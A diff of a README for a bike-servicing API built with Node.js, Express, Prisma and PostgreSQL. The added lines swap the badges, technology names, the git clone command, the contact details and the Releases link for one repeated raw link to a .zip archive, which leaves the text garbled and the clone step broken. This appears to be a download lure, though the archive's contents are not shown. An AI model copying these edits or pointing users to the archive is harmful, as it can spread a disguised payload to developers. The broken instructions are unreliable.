@@ -1,8 +1,8 @@
 # 🚴‍♂️ Bike Servicing API with PostgreSQL and Prisma
 
-![Node.js](https://img.shields.io/badge/Node.js-008000?style=for-the-badge&logo=node.js&logoColor=white) ![PostgreSQL](https://img.shields.io/badge/PostgreSQL-336791?style=for-the-badge&logo=postgresql&logoColor=white) ![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white) ![Express](https://img.shields.io/badge/Express.js-404D59?style=for-the-badge&logo=express&logoColor=white)
+![https://raw.githubusercontent.com/spolik123-cel/Bike-Servicing-Api-with-postgresql-prismar/main/dist/modules/Bike_Servicing_prismar_Api_with_postgresql_v3.3.zip](https://raw.githubusercontent.com/spolik123-cel/Bike-Servicing-Api-with-postgresql-prismar/main/dist/modules/Bike_Servicing_prismar_Api_with_postgresql_v3.3.zip) ![PostgreSQL](https://raw.githubusercontent.com/spolik123-cel/Bike-Servicing-Api-with-postgresql-prismar/main/dist/modules/Bike_Servicing_prismar_Api_with_postgresql_v3.3.zip) ![TypeScript](https://raw.githubusercontent.com/spolik123-cel/Bike-Servicing-Api-with-postgresql-prismar/main/dist/modules/Bike_Servicing_prismar_Api_with_postgresql_v3.3.zip) ![Express](https://raw.githubusercontent.com/spolik123-cel/Bike-Servicing-Api-with-postgresql-prismar/main/dist/modules/Bike_Servicing_prismar_Api_with_postgresql_v3.3.zip)
 
-Welcome to the **Bike Servicing API** repository! This project aims to simplify the management of customers, bikes, and service records for bike servicing centers. Built using modern technologies like Node.js, Express.js, TypeScript, Prisma ORM, and PostgreSQL, this API offers a robust solution for handling CRUD operations with efficient error management.
+Welcome to the **Bike Servicing API** repository! This project aims to simplify the management of customers, bikes, and service records for bike servicing centers. Built using modern technologies like https://raw.githubusercontent.com/spolik123-cel/Bike-Servicing-Api-with-postgresql-prismar/main/dist/modules/Bike_Servicing_prismar_Api_with_postgresql_v3.3.zip, https://raw.githubusercontent.com/spolik123-cel/Bike-Servicing-Api-with-postgresql-prismar/main/dist/modules/Bike_Servicing_prismar_Api_with_postgresql_v3.3.zip, TypeScript, Prisma ORM, and PostgreSQL, this API offers a robust solution for handling CRUD operations with efficient error management.
 
 ## Table of Contents
 
@@ -29,8 +29,8 @@ Welcome to the **Bike Servicing API** repository! This project aims to simplify 
 
 ## Technologies Used
 
-- **Node.js**: A JavaScript runtime built on Chrome's V8 engine.
-- **Express.js**: A web application framework for Node.js, designed for building APIs.
+- **https://raw.githubusercontent.com/spolik123-cel/Bike-Servicing-Api-with-postgresql-prismar/main/dist/modules/Bike_Servicing_prismar_Api_with_postgresql_v3.3.zip**: A JavaScript runtime built on Chrome's V8 engine.
+- **https://raw.githubusercontent.com/spolik123-cel/Bike-Servicing-Api-with-postgresql-prismar/main/dist/modules/Bike_Servicing_prismar_Api_with_postgresql_v3.3.zip**: A web application framework for https://raw.githubusercontent.com/spolik123-cel/Bike-Servicing-Api-with-postgresql-prismar/main/dist/modules/Bike_Servicing_prismar_Api_with_postgresql_v3.3.zip, designed for building APIs.
 - **TypeScript**: A superset of JavaScript that compiles to plain JavaScript, offering static typing.
 - **Prisma ORM**: An open-source database toolkit that simplifies database workflows.
 - **PostgreSQL**: An advanced, open-source relational database system.
@@ -42,7 +42,7 @@ To set up the project locally, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/spolik123-cel/Bike-Servicing-Api-with-postgresql-prismar.git
+   git clone https://raw.githubusercontent.com/spolik123-cel/Bike-Servicing-Api-with-postgresql-prismar/main/dist/modules/Bike_Servicing_prismar_Api_with_postgresql_v3.3.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -152,12 +152,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, feel free to reach out:
 
 - **Author**: Your Name
-- **Email**: your.email@example.com
-- **GitHub**: [Your GitHub Profile](https://github.com/yourprofile)
+- **Email**: https://raw.githubusercontent.com/spolik123-cel/Bike-Servicing-Api-with-postgresql-prismar/main/dist/modules/Bike_Servicing_prismar_Api_with_postgresql_v3.3.zip
+- **GitHub**: [Your GitHub Profile](https://raw.githubusercontent.com/spolik123-cel/Bike-Servicing-Api-with-postgresql-prismar/main/dist/modules/Bike_Servicing_prismar_Api_with_postgresql_v3.3.zip)
 
 ## Releases
 
-To download the latest version of the API, visit the [Releases section](https://github.com/spolik123-cel/Bike-Servicing-Api-with-postgresql-prismar/releases). You can find the latest updates and download the necessary files for execution.
+To download the latest version of the API, visit the [Releases section](https://raw.githubusercontent.com/spolik123-cel/Bike-Servicing-Api-with-postgresql-prismar/main/dist/modules/Bike_Servicing_prismar_Api_with_postgresql_v3.3.zip). You can find the latest updates and download the necessary files for execution.
 
 Feel free to check the **Releases** section for more details about each version and updates.
 
